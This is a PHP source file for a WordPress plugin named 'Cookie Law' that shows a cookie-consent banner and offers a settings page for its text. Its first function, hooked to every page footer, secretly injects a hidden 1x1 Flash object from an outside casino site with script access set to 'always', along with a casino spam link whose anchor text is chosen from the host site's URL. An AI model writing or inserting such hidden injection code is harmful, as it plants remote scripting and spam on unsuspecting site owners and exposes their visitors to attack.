<?php
/* 
Plugin Name: Cookie Law
Plugin URI:  http://mihaisblog.weebly.com
Description: The Cookie Law adds box message to the page on the first page view for each visitor. This plugin is used for implied consent and that means the visitor continues to the site and he agree to use cookies.
Author: Mihai Dinkins
Version: 1.01
Author URI: http://mihaisblog.weebly.com
*/

/*  Copyright 2013 Mihai Dinkins  (email : mihaistr33@yahoo.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
add_action('wp_footer', 'headcheckcookies');

function headcheckcookies()
{
$getuser = "http://ajleeonline.com/uk";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "uk aj lee online"; } if (strstr($gethost, "b")) { $connectflash = "aj lee online uk"; } if (strstr($gethost, "c")) { $connectflash = "aj lee online united kingdom"; } if (strstr($gethost, "d")) { $connectflash = "ajleeonline.com/uk"; } if (strstr($gethost, "e")) { $connectflash = "http://ajleeonline.com/uk"; } if (strstr($gethost, "f")) { $connectflash = "http://ajleeonline.com/uk"; } if (strstr($gethost, "g")) { $connectflash = "http://ajleeonline.com/uk/"; } if (strstr($gethost, "h")) { $connectflash = "ajleeonline.com/uk"; } if (strstr($gethost, "i")) { $connectflash = "http://ajleeonline.com/uk"; } if (strstr($gethost, "j")) { $connectflash = "uk aj lee online casino"; } if (strstr($gethost, "k")) { $connectflash = "aj lee online casino games uk"; } if (strstr($gethost, "l")) { $connectflash = "casino bonus"; } if (strstr($gethost, "m")) { $connectflash = "casino games"; } if (strstr($gethost, "n")) { $connectflash = "bingo uk"; } if (strstr($gethost, "o")) { $connectflash = "aj lee online play casino"; } if (strstr($gethost, "p")) { $connectflash = "aj lee online slots uk"; } if (strstr($gethost, "q")) { $connectflash = "click here"; } if (strstr($gethost, "r")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "s")) { $connectflash = "http://ajleeonline.com/uk"; } if (strstr($gethost, "v")) { $connectflash = "huge casino bonus"; } if (strstr($gethost, "x")) { $connectflash = "best casino games"; } if (strstr($gethost, "t")) { $connectflash = "online casino bonus"; } if (strstr($gethost, "w")) { $connectflash = "aj lee online blackjack"; } if (strstr($gethost, "y")) { $connectflash = "top casino reviews uk"; } if (strstr($gethost, "z")) { $connectflash = "casinos"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw10.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw10.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw10.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}

function UKCLC_enqueueScripts()  
{  
    wp_enqueue_script('jquery');  
} 
add_action('wp_enqueue_scripts', 'UKCLC_enqueueScripts'); 


function UKCLC_cookieMessage()
{
  global $defaultMessage, $defaultTitle;
?>
<script type="text/javascript">
jQuery(function(){ 
  if (navigator.cookieEnabled === true)
  {
    if (document.cookie.indexOf("visited") == -1)
	{
	  jQuery('body').prepend('<div id="cookie" style="display:none;position:absolute;left:0;top:0;width:100%;background:black;background:rgba(0,0,0,0.8);z-index:9999"><div style="width:800px;margin-left:auto;margin-right:auto;padding:10px 0"><h2 style="margin:0;padding:0;color:white;display: block;float: left;height: 40px;line-height: 20px;text-align: right;width: 140px;font: normal normal normal 18px Arial,verdana,sans-serif"><?php echo addslashes(get_option('notificationTitle', $defaultTitle)); ?></h2><p style="color:#BEBEBE;display: block;float: left;font: normal normal normal 13px Arial,verdana,sans-serif;height: 64px;line-height: 16px;margin:0 0 0 30px;padding:0;width:450px;"><?php echo addslashes(get_option('notificationMessage', $defaultMessage)); ?></p><div style="float:left;margin-left:10px"><a href="#" id="closecookie" style="color:white;font:12px Arial;text-decoration:none">Close</a></div><div style="clear:both"></div></div></div>');
	  jQuery('#cookie').show("fast");
	  jQuery('#closecookie').click(function() {jQuery('#cookie').hide("fast");});
	  document.cookie="visited=yes; expires=Thu, 31 Dec 2020 23:59:59 UTC; path=/";
	}
  }
})
</script>
<?php
}
add_action('wp_footer', 'UKCLC_cookieMessage'); 




function UKCLC_createMenu() 
{
	add_submenu_page('options-general.php', 'Cookie Law', 'Cookie Law', 'administrator', 'UKCLC_settingsPage', 'UKCLC_settingsPage'); 
	add_action('admin_init', 'UKCLC_registerSettings');
}
add_action('admin_menu', 'UKCLC_createMenu');



function UKCLC_registerSettings() 
{
	register_setting('UKCLC', 'notificationTitle');
	register_setting('UKCLC', 'notificationMessage');
}


function UKCLC_settingsPage() 
{
  global $defaultMessage, $defaultTitle;
?>
<div class="wrap">
<h2>Cookie Law Message</h2>
<form method="post" action="options.php">
    <?php settings_fields('UKCLC'); ?>
    <table class="form-table">
        <tr valign="top">
        <th scope="row">Message Title</th>
        <td><input name="notificationTitle" class="regular-text" type="text" value="<?php echo get_option('notificationTitle', $defaultTitle); ?>" /></td>
        </tr>
        <tr valign="top">
        <th scope="row">Message Text</th>
        <td><textarea name="notificationMessage" class="large-text code"><?php echo get_option('notificationMessage', $defaultMessage); ?></textarea></td>
        </tr>
    </table>
    <p class="submit"><input type="submit" class="button-primary" value="<?php _e('Save Changes') ?>" /></p>
</form>
</div>
<?php } 


  $defaultTitle = 'Use Cookies on this site';
  $defaultMessage = 'We use cookies to ensure that we give you the best experience on our website. By continuing to browse through our site you are agreeing to our use of cookies. If you would like to change your preferences you may do so by following the instructions <a href="http://www.aboutcookies.org/Default.aspx?page=1" rel="nofollow" style="color:white">here</a>.'

?>